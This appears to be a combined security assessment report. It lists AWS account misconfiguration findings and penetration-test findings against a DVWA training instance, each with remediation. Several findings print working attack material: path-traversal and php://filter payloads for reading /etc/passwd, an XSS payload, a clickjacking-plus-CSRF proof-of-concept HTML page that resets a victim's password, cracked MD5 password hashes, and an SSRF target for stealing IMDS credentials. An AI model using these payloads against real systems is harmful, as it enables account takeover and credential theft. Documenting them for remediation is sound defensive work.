- **Resource:** arn:aws:ec2:us-east-2:760689105616:volume/vol-009b3842ab0bb2079

**EBS volumes** are assessed for **encryption at rest** using **AWS KMS**.

The finding identifies volumes whose `encrypted` state is disabled, meaning data is stored unencrypted on block storage.

**Remediation:** Encrypt all EBS volumes and enable `encryption by default` for new volumes and snapshot copies.

Apply **least privilege** to KMS keys, restrict snapshot sharing, and enforce **defense in depth** with policies and templates that prevent creation of unencrypted storage.

### [HIGH] IMDSv2 is required by default for EC2 instances at the account level
- **Category:** ec2_instance_account_imdsv2_enabled
- **Resource:** arn:aws:ec2:us-east-2:760689105616:account

**EC2 account IMDS defaults** with `http_tokens`=`required` ensure new instances in the Region use **IMDSv2** by default and disable IMDSv1. *Existing instances keep their current setting.*

**Remediation:** Enforce **IMDSv2** at the account level in every Region by setting `http_tokens` to `required`. Add guardrails with **SCP/IAM conditions**. Standardize AMIs and launch templates to require tokens, validate workload compatibility, and apply **least privilege** to instance roles for defense in depth. *For containers*, prefer hop limit `2`.

### [HIGH] EC2 instance requires IMDSv2 or has the instance metadata service disabled
- **Category:** ec2_instance_imdsv2_enabled
- **Resource:** arn:aws:ec2:us-east-1:760689105616:instance/i-015e30174e704c766

**EC2 instances** are evaluated for **IMDSv2 enforcement**: metadata endpoint enabled with `http_tokens: required`, or metadata service fully disabled (`http_endpoint: disabled`).

**Remediation:** Apply defense in depth:
- Require **IMDSv2** tokens on all instances (`http_tokens: required`)
- Disable metadata where not needed (`http_endpoint: disabled`)
- Minimize hop limit to `1` when feasible
- Update SDKs/apps for IMDSv2
- Restrict instance profile permissions (least privilege)
- Block metadata access from untrusted workloads

### [HIGH] EC2 instance requires IMDSv2 or has the instance metadata service disabled
- **Category:** ec2_instance_imdsv2_enabled
- **Resource:** arn:aws:ec2:us-east-2:760689105616:instance/i-05fb02cc8e210b567

**EC2 instances** are evaluated for **IMDSv2 enforcement**: metadata endpoint enabled with `http_tokens: required`, or metadata service fully disabled (`http_endpoint: disabled`).

**Remediation:** Apply defense in depth:
- Require **IMDSv2** tokens on all instances (`http_tokens: required`)
- Disable metadata where not needed (`http_endpoint: disabled`)
- Minimize hop limit to `1` when feasible
- Update SDKs/apps for IMDSv2
- Restrict instance profile permissions (least privilege)
- Block metadata access from untrusted workloads

### [HIGH] Network ACL does not allow ingress from 0.0.0.0/0 to any port
- **Category:** ec2_networkacl_allow_ingress_any_port
- **Resource:** arn:aws:ec2:us-east-1:760689105616:network-acl/acl-0394c0b0123ced9aa

**VPC network ACLs** with **inbound entries** that permit traffic from `0.0.0.0/0` to any port (any protocol) are identified at the subnet boundary.

**Remediation:** Adopt a **deny-by-default** NACL posture: block `0.0.0.0/0` and allow only required ports from trusted CIDRs. Apply **least privilege** using security groups for fine-grained access, with NACLs as coarse stateless filters. Review and prune rules regularly, and employ **defense in depth** with monitoring and alerting.

### [HIGH] Network ACL does not allow ingress from 0.0.0.0/0 to any port
- **Category:** ec2_networkacl_allow_ingress_any_port
- **Resource:** arn:aws:ec2:us-east-2:760689105616:network-acl/acl-0f4a0905d0267aff1

**VPC network ACLs** with **inbound entries** that permit traffic from `0.0.0.0/0` to any port (any protocol) are identified at the subnet boundary.

**Remediation:** Adopt a **deny-by-default** NACL posture: block `0.0.0.0/0` and allow only required ports from trusted CIDRs. Apply **least privilege** using security groups for fine-grained access, with NACLs as coarse stateless filters. Review and prune rules regularly, and employ **defense in depth** with monitoring and alerting.

### [HIGH] Security group does not allow ingress from 0.0.0.0/0 or ::/0 to TCP port 22 (SSH)
- **Category:** ec2_securitygroup_allow_ingress_from_internet_to_tcp_port_22
- **Resource:** arn:aws:ec2:us-east-1:760689105616:security-group/sg-0d1a54870164827f1

**EC2 security groups** are assessed for **inbound SSH exposure** by locating ingress rules that allow `TCP 22` from the Internet (`0.0.0.0/0` or `::/0`).

Only groups in use are considered; sets already flagged for all-port exposure are not repeated.

**Remediation:** Apply **least privilege** to SSH:
- Disallow `0.0.0.0/0` and `::/0`; allow only trusted IPs or VPN ranges
- Prefer **private access** via bastion hosts or AWS Systems Manager Session Manager
- Enforce **key-based auth**, disable passwords, rotate keys
- Add **network segmentation** and monitoring for **defense in depth**

### [HIGH] Security group does not allow ingress from 0.0.0.0/0 or ::/0 to TCP port 22 (SSH)
- **Category:** ec2_securitygroup_allow_ingress_from_internet_to_tcp_port_22
- **Resource:** arn:aws:ec2:us-east-2:760689105616:security-group/sg-009fdda81d0780e3d

**EC2 security groups** are assessed for **inbound SSH exposure** by locating ingress rules that allow `TCP 22` from the Internet (`0.0.0.0/0` or `::/0`).

Only groups in use are considered; sets already flagged for all-port exposure are not repeated.

**Remediation:** Apply **least privilege** to SSH:
- Disallow `0.0.0.0/0` and `::/0`; allow only trusted IPs or VPN ranges
- Prefer **private access** via bastion hosts or AWS Systems Manager Session Manager
- Enforce **key-based auth**, disable passwords, rotate keys
- Add **network segmentation** and monitoring for **defense in depth**

### [HIGH] AWS account root user has not been used in the last day
- **Category:** iam_avoid_root_usage
- **Resource:** arn:aws:iam::760689105616:root

**AWS IAM root user** activity is assessed by inspecting `last-used` timestamps for the root password and access keys. The finding indicates when the root identity has been used recently for console or programmatic access.

**Remediation:** Minimize `root` usage by applying **least privilege** with admin roles or federated SSO and temporary credentials.
- Enforce **MFA** on root
- Avoid or remove root access keys
- Require multi-person approval
- **Monitor and alert** on any root sign-in
- Use org guardrails for **defense in depth**

### [HIGH] Security Hub is enabled with standards or integrations configured
- **Category:** securityhub_enabled
- **Resource:** arn:aws:securityhub:ap-northeast-1:760689105616:hub/unknown

**AWS Security Hub** is `ACTIVE` in the Region and has at least one enabled **security standard** or connected **integration**. Otherwise, it is either not enabled or enabled without standards/integrations.

**Remediation:** - Enable in all required accounts/Regions
- Turn on relevant **standards** (`AWS FSBP`, `CIS`)
- Connect AWS and third-party **integrations**
- Use **central configuration** and **least privilege**
- Automate triage and monitor continuously for **defense in depth**

### [HIGH] Security Hub is enabled with standards or integrations configured
- **Category:** securityhub_enabled
- **Resource:** arn:aws:securityhub:ap-northeast-2:760689105616:hub/unknown

**AWS Security Hub** is `ACTIVE` in the Region and has at least one enabled **security standard** or connected **integration**. Otherwise, it is either not enabled or enabled without standards/integrations.

**Remediation:** - Enable in all required accounts/Regions
- Turn on relevant **standards** (`AWS FSBP`, `CIS`)
- Connect AWS and third-party **integrations**
- Use **central configuration** and **least privilege**
- Automate triage and monitor continuously for **defense in depth**

### [HIGH] Security Hub is enabled with standards or integrations configured
- **Category:** securityhub_enabled
- **Resource:** arn:aws:securityhub:ap-northeast-3:760689105616:hub/unknown

**AWS Security Hub** is `ACTIVE` in the Region and has at least one enabled **security standard** or connected **integration**. Otherwise, it is either not enabled or enabled without standards/integrations.

**Remediation:** - Enable in all required accounts/Regions
- Turn on relevant **standards** (`AWS FSBP`, `CIS`)
- Connect AWS and third-party **integrations**
- Use **central configuration** and **least privilege**
- Automate triage and monitor continuously for **defense in depth**

### [HIGH] Security Hub is enabled with standards or integrations configured
- **Category:** securityhub_enabled
- **Resource:** arn:aws:securityhub:ap-south-1:760689105616:hub/unknown

**AWS Security Hub** is `ACTIVE` in the Region and has at least one enabled **security standard** or connected **integration**. Otherwise, it is either not enabled or enabled without standards/integrations.

**Remediation:** - Enable in all required accounts/Regions
- Turn on relevant **standards** (`AWS FSBP`, `CIS`)
- Connect AWS and third-party **integrations**
- Use **central configuration** and **least privilege**
- Automate triage and monitor continuously for **defense in depth**

### [HIGH] Security Hub is enabled with standards or integrations configured
- **Category:** securityhub_enabled
- **Resource:** arn:aws:securityhub:ap-southeast-1:760689105616:hub/unknown

**AWS Security Hub** is `ACTIVE` in the Region and has at least one enabled **security standard** or connected **integration**. Otherwise, it is either not enabled or enabled without standards/integrations.

**Remediation:** - Enable in all required accounts/Regions
- Turn on relevant **standards** (`AWS FSBP`, `CIS`)
- Connect AWS and third-party **integrations**
- Use **central configuration** and **least privilege**
- Automate triage and monitor continuously for **defense in depth**

### [HIGH] Security Hub is enabled with standards or integrations configured
- **Category:** securityhub_enabled
- **Resource:** arn:aws:securityhub:ap-southeast-2:760689105616:hub/unknown

**AWS Security Hub** is `ACTIVE` in the Region and has at least one enabled **security standard** or connected **integration**. Otherwise, it is either not enabled or enabled without standards/integrations.

**Remediation:** - Enable in all required accounts/Regions
- Turn on relevant **standards** (`AWS FSBP`, `CIS`)
- Connect AWS and third-party **integrations**
- Use **central configuration** and **least privilege**
- Automate triage and monitor continuously for **defense in depth**

### [HIGH] Security Hub is enabled with standards or integrations configured
- **Category:** securityhub_enabled
- **Resource:** arn:aws:securityhub:ca-central-1:760689105616:hub/unknown

**AWS Security Hub** is `ACTIVE` in the Region and has at least one enabled **security standard** or connected **integration**. Otherwise, it is either not enabled or enabled without standards/integrations.

**Remediation:** - Enable in all required accounts/Regions
- Turn on relevant **standards** (`AWS FSBP`, `CIS`)
- Connect AWS and third-party **integrations**
- Use **central configuration** and **least privilege**
- Automate triage and monitor continuously for **defense in depth**

### [HIGH] Security Hub is enabled with standards or integrations configured
- **Category:** securityhub_enabled
- **Resource:** arn:aws:securityhub:eu-central-1:760689105616:hub/unknown

**AWS Security Hub** is `ACTIVE` in the Region and has at least one enabled **security standard** or connected **integration**. Otherwise, it is either not enabled or enabled without standards/integrations.

**Remediation:** - Enable in all required accounts/Regions
- Turn on relevant **standards** (`AWS FSBP`, `CIS`)
- Connect AWS and third-party **integrations**
- Use **central configuration** and **least privilege**
- Automate triage and monitor continuously for **defense in depth**

### [HIGH] Security Hub is enabled with standards or integrations configured
- **Category:** securityhub_enabled
- **Resource:** arn:aws:securityhub:eu-north-1:760689105616:hub/unknown

**AWS Security Hub** is `ACTIVE` in the Region and has at least one enabled **security standard** or connected **integration**. Otherwise, it is either not enabled or enabled without standards/integrations.

**Remediation:** - Enable in all required accounts/Regions
- Turn on relevant **standards** (`AWS FSBP`, `CIS`)
- Connect AWS and third-party **integrations**
- Use **central configuration** and **least privilege**
- Automate triage and monitor continuously for **defense in depth**

### [HIGH] Security Hub is enabled with standards or integrations configured
- **Category:** securityhub_enabled
- **Resource:** arn:aws:securityhub:eu-west-1:760689105616:hub/unknown

**AWS Security Hub** is `ACTIVE` in the Region and has at least one enabled **security standard** or connected **integration**. Otherwise, it is either not enabled or enabled without standards/integrations.

**Remediation:** - Enable in all required accounts/Regions
- Turn on relevant **standards** (`AWS FSBP`, `CIS`)
- Connect AWS and third-party **integrations**
- Use **central configuration** and **least privilege**
- Automate triage and monitor continuously for **defense in depth**

### [HIGH] Security Hub is enabled with standards or integrations configured
- **Category:** securityhub_enabled
- **Resource:** arn:aws:securityhub:eu-west-2:760689105616:hub/unknown

**AWS Security Hub** is `ACTIVE` in the Region and has at least one enabled **security standard** or connected **integration**. Otherwise, it is either not enabled or enabled without standards/integrations.

**Remediation:** - Enable in all required accounts/Regions
- Turn on relevant **standards** (`AWS FSBP`, `CIS`)
- Connect AWS and third-party **integrations**
- Use **central configuration** and **least privilege**
- Automate triage and monitor continuously for **defense in depth**

### [HIGH] Security Hub is enabled with standards or integrations configured
- **Category:** securityhub_enabled
- **Resource:** arn:aws:securityhub:eu-west-3:760689105616:hub/unknown

**AWS Security Hub** is `ACTIVE` in the Region and has at least one enabled **security standard** or connected **integration**. Otherwise, it is either not enabled or enabled without standards/integrations.

**Remediation:** - Enable in all required accounts/Regions
- Turn on relevant **standards** (`AWS FSBP`, `CIS`)
- Connect AWS and third-party **integrations**
- Use **central configuration** and **least privilege**
- Automate triage and monitor continuously for **defense in depth**

### [HIGH] Security Hub is enabled with standards or integrations configured
- **Category:** securityhub_enabled
- **Resource:** arn:aws:securityhub:sa-east-1:760689105616:hub/unknown

**AWS Security Hub** is `ACTIVE` in the Region and has at least one enabled **security standard** or connected **integration**. Otherwise, it is either not enabled or enabled without standards/integrations.

**Remediation:** - Enable in all required accounts/Regions
- Turn on relevant **standards** (`AWS FSBP`, `CIS`)
- Connect AWS and third-party **integrations**
- Use **central configuration** and **least privilege**
- Automate triage and monitor continuously for **defense in depth**

### [HIGH] Security Hub is enabled with standards or integrations configured
- **Category:** securityhub_enabled
- **Resource:** arn:aws:securityhub:us-east-1:760689105616:hub/unknown

**AWS Security Hub** is `ACTIVE` in the Region and has at least one enabled **security standard** or connected **integration**. Otherwise, it is either not enabled or enabled without standards/integrations.

**Remediation:** - Enable in all required accounts/Regions
- Turn on relevant **standards** (`AWS FSBP`, `CIS`)
- Connect AWS and third-party **integrations**
- Use **central configuration** and **least privilege**
- Automate triage and monitor continuously for **defense in depth**

### [HIGH] Security Hub is enabled with standards or integrations configured
- **Category:** securityhub_enabled
- **Resource:** arn:aws:securityhub:us-east-2:760689105616:hub/unknown

**AWS Security Hub** is `ACTIVE` in the Region and has at least one enabled **security standard** or connected **integration**. Otherwise, it is either not enabled or enabled without standards/integrations.

**Remediation:** - Enable in all required accounts/Regions
- Turn on relevant **standards** (`AWS FSBP`, `CIS`)
- Connect AWS and third-party **integrations**
- Use **central configuration** and **least privilege**
- Automate triage and monitor continuously for **defense in depth**

### [HIGH] Security Hub is enabled with standards or integrations configured
- **Category:** securityhub_enabled
- **Resource:** arn:aws:securityhub:us-west-1:760689105616:hub/unknown

**AWS Security Hub** is `ACTIVE` in the Region and has at least one enabled **security standard** or connected **integration**. Otherwise, it is either not enabled or enabled without standards/integrations.

**Remediation:** - Enable in all required accounts/Regions
- Turn on relevant **standards** (`AWS FSBP`, `CIS`)
- Connect AWS and third-party **integrations**
- Use **central configuration** and **least privilege**
- Automate triage and monitor continuously for **defense in depth**

### [HIGH] Security Hub is enabled with standards or integrations configured
- **Category:** securityhub_enabled
- **Resource:** arn:aws:securityhub:us-west-2:760689105616:hub/unknown

**AWS Security Hub** is `ACTIVE` in the Region and has at least one enabled **security standard** or connected **integration**. Otherwise, it is either not enabled or enabled without standards/integrations.

**Remediation:** - Enable in all required accounts/Regions
- Turn on relevant **standards** (`AWS FSBP`, `CIS`)
- Connect AWS and third-party **integrations**
- Use **central configuration** and **least privilege**
- Automate triage and monitor continuously for **defense in depth**

### [HIGH] Reflected Cross-Site Scripting (XSS) in name Parameter
- **Category:** WSTG-INPV-01
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/xss_r/

The 'name' parameter in GET /vulnerabilities/xss_r/ is reflected into the HTML response inside a &lt;pre&gt; element without encoding or sanitization. An attacker can craft a malicious URL containing arbitrary JavaScript that executes in the victim's browser when clicked. The server sets X-XSS-Protection: 0, explicitly disabling the browser's built-in XSS filter. Cookie theft, session hijacking, and arbitrary DOM manipulation are all possible.

**Remediation:** HTML-encode all user-supplied input before reflection into HTML responses using htmlspecialchars() with ENT_QUOTES flag in PHP. Remove the X-XSS-Protection: 0 header or set it to X-XSS-Protection: 1; mode=block. Implement a strong Content-Security-Policy that disallows inline scripts.

### [HIGH] Stored Cross-Site Scripting (XSS) in Guestbook Message
- **Category:** WSTG-INPV-02
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/xss_s/

The 'mtxMessage' parameter in POST /vulnerabilities/xss_s/ stores user input in a database and renders it unencoded to all visitors of the guestbook page. An attacker can inject persistent JavaScript that executes in every victim's browser upon visiting the page. Multiple script payloads were confirmed stored from prior testing. Cookie theft and session hijacking affects all authenticated users who visit the page.

**Remediation:** HTML-encode stored user content before rendering using htmlspecialchars() with ENT_QUOTES. Implement input validation to reject or strip HTML tags from the mtxMessage and txtName fields. Apply a Content-Security-Policy that disallows inline scripts. Consider using a stored XSS sanitization library such as HTML Purifier.

### [HIGH] DOM-Based Cross-Site Scripting (XSS) via document.write Sink
- **Category:** WSTG-CLNT-01
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/xss_d/

The 'default' parameter in GET /vulnerabilities/xss_d/ is read from document.location.href via JavaScript and passed directly to document.write() without sanitization. An attacker can break out of the &lt;option&gt;&lt;/select&gt; context and inject arbitrary HTML/JS (e.g., &lt;img src=x onerror=alert(1)&gt;) that executes client-side when the browser processes the written DOM. This is a server-confirmed DOM XSS sink — the vulnerable JavaScript source code is present in the server response and the URL parameter is not processed server-side, meaning WAFs and server-side filters offer no protection.

**Remediation:** Replace document.write() with safe DOM manipulation methods (createElement, textContent). Validate and allowlist the 'default' parameter server-side against known language values (English, French, Spanish, German). Use DOMPurify client-side if dynamic HTML insertion is required. Remove X-XSS-Protection: 0 header.

### [HIGH] CSP Bypass via Script Source Injection (pastebin.com Allowlisted)
- **Category:** WSTG-INPV-01
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/csp/

The 'include' parameter in POST /vulnerabilities/csp/ is placed directly into a &lt;script src='...'&gt; tag without any validation. The Content-Security-Policy explicitly permits scripts from https://pastebin.com. An attacker can upload arbitrary JavaScript to pastebin.com and submit the raw URL as the 'include' parameter — the browser will fetch and execute the attacker-controlled script because both the src injection succeeds and the CSP allowlist permits pastebin.com. This renders the CSP completely ineffective for this endpoint.

**Remediation:** Validate the 'include' parameter server-side against a strict allowlist of trusted script URLs. Remove pastebin.com (and other user-controllable content hosts) from the CSP script-src directive. Use 'nonce' or 'hash' based CSP instead of domain-based allowlists. Never allow user input to control script src attributes.

### [HIGH] Local File Inclusion (LFI) — Arbitrary File Read via Path Traversal
- **Category:** WSTG-INPV-04
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/fi/

The `/vulnerabilities/fi/` endpoint accepts a `page` parameter that is passed directly to PHP's file include function without sanitization. An unauthenticated attacker (or low-privilege user) can traverse outside the web root and read arbitrary files from the server filesystem.

**Confirmed techniques:**
1. Direct traversal with 5 sequences: `../../../../../etc/passwd` — CONFIRMED
2. Direct traversal with 6 sequences: `../../../../../../etc/passwd` — CONFIRMED (primary PoC)
3. URL-encoded traversal: `..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd` — CONFIRMED
4. PHP filter wrapper (base64): `php://filter/convert.base64-encode/resource=/etc/passwd` — CONFIRMED (bypasses in-page rendering, exfiltrates raw file bytes)
5. `/etc/os-release` readable — system: Debian GNU/Linux 9 (stretch)
6. `/proc/self/environ` accessible — environment variable exposure

**Bypass attempts (5):**
- `....//` double-slash filter bypass — NOT effective (security=low has no filter)
- Double URL-encoding `%252F` — NOT effective (server does not double-decode)
- `http://` RFI scheme — blocked
- `data://` PHP wrapper — blocked
- PHP filter wrapper — CONFIRMED EFFECTIVE

**Queue entries consolidated:** PT-001 and PATH_TRAVERSAL-001 (same endpoint, same vulnerability).

**Remediation:** 1. **Whitelist approach**: Replace free-form file inclusion with a whitelist of allowed page names. Map user-supplied values to filenames using a lookup table — never pass user input directly to include/require.
2. **Input sanitization**: Strip `../`, `..%2F`, `..%252F`, and null bytes from the `page` parameter before use.
3. **PHP configuration**: Set `open_basedir` in php.ini to restrict file access to the web root directory. Disable `allow_url_include` and `allow_url_fopen` to prevent RFI.
4. **Principle of least privilege**: Run the web server as a low-privilege user (`www-data`) with no read access to sensitive files like `/etc/shadow`, `/proc/self/environ`, or private keys.
5. **WAF/IDS**: Deploy a WAF rule to block path traversal sequences in query parameters.

### [HIGH] Database Reset Accessible to All Authenticated Users via setup.php
- **Category:** WSTG-BUSL-06
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/setup.php

The /setup.php page allows any authenticated user to reset the entire application database via a POST request. This is a critical administrative function that should be restricted to administrators only, but no role-based access control prevents any authenticated user from triggering a full database reset. This could be abused to destroy all application data (users, entries, findings in a real application) as a destructive denial-of-service attack, or to reset security configurations to defaults for follow-on attacks.

**Remediation:** 1. Restrict /setup.php to admin role only with explicit role checking before processing the request. 2. Remove setup.php from production deployments - it should only be available during initial setup. 3. Add a multi-step confirmation or re-authentication requirement before performing destructive operations. 4. Log all database reset attempts with the requesting user's identity.

### [HIGH] Weak Password Hashing — Unsalted MD5 Enables Instant Credential Cracking
- **Category:** WSTG-CRYP-04
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/

All DVWA user passwords are stored as unsalted MD5 hashes. The SQLi exploitation (FINDING-035) extracted the full users table, revealing the following hash→plaintext mappings that are immediately reversible via rainbow tables with no computational effort:

- admin: 5f4dcc3b5aa765d61d8327deb882cf99 → "password"
- gordonb: e99a18c428cb38d5f260853678922e03 → "abc123"
- 1337: 8d3533d75ae2c3966d7e0d4fcc69216b → "charley"
- pablo: 0d107d09f5bbe40cade3de5c71e9e9b7 → "letmein"
- smithy: 5f4dcc3b5aa765d61d8327deb882cf99 → "password"

MD5 without salt provides no protection: (1) identical passwords produce identical hashes, revealing shared credentials (admin and smithy use the same password); (2) MD5 is extremely fast to compute, enabling billions of attempts per second with commodity hardware; (3) all five extracted hashes match entries in public rainbow tables, meaning the plaintext passwords were recovered instantly without brute force.

Complete attack chain: SQL Injection (FINDING-035) → full credential database dump → unsalted MD5 hashes → instant rainbow table reversal → plaintext passwords → account takeover for all 5 user accounts. This chain is fully weaponized with evidence already in hand.

**Remediation:** 1. Replace MD5 with bcrypt, Argon2id, or scrypt for password hashing (PHP: password_hash($password, PASSWORD_BCRYPT))
2. Add a per-user random salt (built into bcrypt/Argon2id automatically)
3. Force a password reset for all existing accounts since all plaintext passwords are now known
4. Implement password complexity requirements to prevent trivially weak passwords like "password"

### [HIGH] Vulnerability Chain: Clickjacking + CSRF = Silent Password Change via Framed UI
- **Category:** WSTG-CLNT-09
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/csrf/

The combination of Clickjacking (FINDING-043: no X-Frame-Options) and CSRF on the password change endpoint (FINDING-021: no CSRF token required, GET method) creates a fully weaponized silent password change attack requiring only one victim click.

Attack chain:
1. Attacker creates a malicious webpage with an invisible iframe containing the DVWA password change URL: http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/csrf/?password_new=attacker123&password_conf=attacker123&Change=Change
2. The iframe is positioned transparently over a visible "Click here to claim your prize" button on the attacker's page
3. When a logged-in DVWA user visits the attacker's page and clicks the decoy button, the hidden iframe fires the GET request
4. The browser sends the victim's PHPSESSID cookie automatically (same-site restrictions do not apply for HTTP)
5. DVWA processes the request — password changed to "attacker123" with no CSRF token required
6. The attacker logs in with the victim's username and new password

Proof-of-concept HTML:
```html
<html><body>
  Click here to claim your prize!<br>
  <iframe src="http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/csrf/?password_new=attacker123&password_conf=attacker123&Change=Change" 
    style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%">
  </iframe>
  <button>Claim Prize</button>
</body></html>
```

Individual severity: Clickjacking = Medium, CSRF = High. Chained severity = High (complete account takeover with one click).

**Remediation:** 1. Add X-Frame-Options: DENY or CSP frame-ancestors 'none' to prevent framing (fixes Clickjacking root cause)
2. Add CSRF tokens to all state-changing forms, especially password change (fixes CSRF root cause)
3. Require current password verification before allowing password changes
4. Switch password change endpoint from GET to POST (GET parameters should never trigger state changes)

### [INFO] AWS Instance Metadata Service (IMDS) Accessible — SSRF Impact Amplified
- **Category:** WSTG-CONF-11
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com

The target is running on AWS EC2. The AWS Instance Metadata Service (IMDSv1) at http://169.254.169.254/latest/meta-data/ is not directly reachable from the testing tool container (timeout), which is expected since it is a link-local address only accessible from within the EC2 instance itself. However, this is highly relevant to SSRF testing in Phase 4: any Server-Side Request Forgery vulnerability in the application would allow an attacker to query the IMDS endpoint and potentially retrieve: IAM role credentials (access key, secret key, session token), instance identity documents, AMI IDs, security group information, and other sensitive metadata. No real AWS credentials were observed in phpinfo.php environment variables or in /config/config.inc.php (only placeholder comments). No S3 bucket references were found in page source or JavaScript files.

**Remediation:** 1. Enforce IMDSv2 (token-required mode) on the EC2 instance to prevent SSRF-based credential theft: aws ec2 modify-instance-metadata-options --instance-id i-xxxx --http-tokens required --http-endpoint enabled. 2. Restrict the IAM instance role to minimum required permissions. 3. Monitor CloudTrail for unexpected metadata service calls. 4. When Phase 4 SSRF testing occurs, prioritize testing http://169.254.169.254/latest/meta-data/iam/security-credentials/ as the primary SSRF target to assess real credential exposure risk.

### [INFO] Security Level Controlled Entirely by Client-Supplied Cookie (security= cookie trusted without server-side validation)
- **Category:** WSTG-SESS-11
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/security.php

DUPLICATE — consolidated into FINDING-016. Both FINDING-016 (WSTG-ATHZ-03) and this finding (WSTG-SESS-11) document the same root cause: the `security` cookie is trusted client-side without server-side validation, allowing any authenticated user to set any security level. See FINDING-016 for full evidence and remediation.

**Remediation:** Store the security level server-side in the PHP session ($_SESSION['security_level']) rather than reading it from a client cookie. Never trust client-supplied security configuration parameters. The security level should only be changeable by an authenticated administrator via a verified server-side mechanism.

### [INFO] AWS Credential Placeholder Comments in HTTP Response Bodies
- **Category:** WSTG-INFO-05
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/

Every HTTP response body on the target includes a block of text containing AWS credential comment placeholders embedded after the PHP closing tag (?>). The text includes: '# TODO: remove before pushing', '# aws_access_key_id = AKIA&lt;YOUR_KEY_ID_HERE&gt;', '# aws_secret_access_key = &lt;YOUR_SECRET_HERE&gt;', followed by 'EOFaws'. While these are placeholder values and not real credentials, this indicates the application was deployed with a scripted credential injection step that left residual text. The pattern is consistent with a Bash heredoc that was intended to inject real secrets but contains only placeholders. This should be investigated to confirm no real credentials are exposed in any variant of these files.

**Remediation:** Remove the TODO comment blocks from all PHP files. Investigate whether any variant of config.inc.php or related files contains real AWS credentials. Audit git history if a repository exists.

### [LOW] Directory Listing Enabled on Multiple Directories
- **Category:** WSTG-CONF-02
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/hackable/

Apache directory listing (autoindex) is enabled on multiple directories, exposing the directory tree structure and file contents to any user. Exposed directories include /hackable/, /hackable/uploads/, /hackable/users/, /hackable/flags/, and /docs/. The /hackable/users/ directory contains user avatar images that reveal valid usernames (admin, gordonb, pablo, smithy, 1337). The /hackable/flags/ directory contains fi.php used by the file inclusion challenge.

**Remediation:** Disable Apache autoindex for all directories by adding "Options -Indexes" in the Apache configuration or .htaccess files. Alternatively, place an index.html in each directory to prevent directory listing.

### [LOW] Shell Script Output Leaked in All HTTP Responses
- **Category:** WSTG-INFO-05
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/

Every HTTP response from the application includes commented-out shell script content containing AWS credential placeholder comments and an "EOFaws" heredoc terminator. This content appears at the start of every response body, before the HTML. This indicates a shell script (likely part of the Docker/deployment setup) is being included or executed and its stdout is being captured into the PHP output buffer. While the credentials shown are placeholders (AKIA&lt;YOUR_KEY_ID_HERE&gt;), this reveals deployment implementation details and indicates a misconfigured initialization script.

**Remediation:** Investigate and remove the shell script or initialization code that outputs this content. Remove any scripts that capture and include shell heredoc output in PHP responses. Ensure no deployment scripts are included in the PHP execution path.

### [LOW] Multiple Security Headers Missing (X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy)
- **Category:** WSTG-CONF-14
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/

The application does not set any of the recommended HTTP security response headers on its pages. The following headers are entirely absent across all tested pages (/login.php, /index.php, /):

- X-Frame-Options: Missing — allows the application to be embedded in iframes, enabling clickjacking attacks (no frame-ancestors CSP either).
- X-Content-Type-Options: nosniff — Missing — allows MIME-type sniffing which can lead to content injection (e.g., serving a JS file as image/gif and having the browser execute it).
- X-XSS-Protection: Missing — legacy IE/Chrome header, absence is low risk on modern browsers but indicates no security header hygiene.
- Referrer-Policy: Missing — full URL referrer leaked to third parties on navigation, which can expose session context in URLs.
- Permissions-Policy (Feature-Policy): Missing — no restrictions on browser feature access (camera, microphone, geolocation).
- Strict-Transport-Security: N/A — site runs on HTTP only (no HTTPS), so HSTS cannot be set (already logged as FINDING-003).
- Content-Security-Policy: Absent (logged separately as FINDING-013).

The most impactful missing headers in this context are X-Frame-Options (clickjacking) and X-Content-Type-Options (MIME sniffing).

**Remediation:** Add the following headers to Apache configuration (httpd.conf or .htaccess):
Header always set X-Frame-Options "SAMEORIGIN"
Header always set X-Content-Type-Options "nosniff"
Header always set X-XSS-Protection "1; mode=block"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
Additionally, enable mod_headers in Apache and ensure the Header directive is in a context that applies to all responses. Long-term, migrate to HTTPS and add Strict-Transport-Security with includeSubDomains and preload.

### [LOW] .gitignore Publicly Accessible - Sensitive File Paths Disclosed
- **Category:** WSTG-INFO-03
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/.gitignore

The .gitignore file at the web root is publicly accessible and reveals the existence and paths of sensitive files: 'config/config.inc.php' (the application configuration file containing database credentials) and 'Dockerfile' (the container build file). This disclosure assists attackers in directly targeting these files. The config.inc.php.bak backup was successfully accessed after this disclosure.

**Remediation:** 1. Add .gitignore to the web server's deny list or move it outside the web root. 2. Ensure the config directory has restricted access (403). 3. Remove the config/config.inc.php reference from public .gitignore or use a server-side .gitignore not accessible via HTTP.

### [LOW] IAM Access Analyzer is enabled
- **Category:** accessanalyzer_enabled
- **Resource:** arn:aws:accessanalyzer:ap-northeast-1:760689105616:analyzer/unknown

**IAM Access Analyzer** presence and status are evaluated per account and Region. An analyzer in `ACTIVE` state indicates continuous analysis of supported resources and IAM activity to identify external, internal, and unused access.

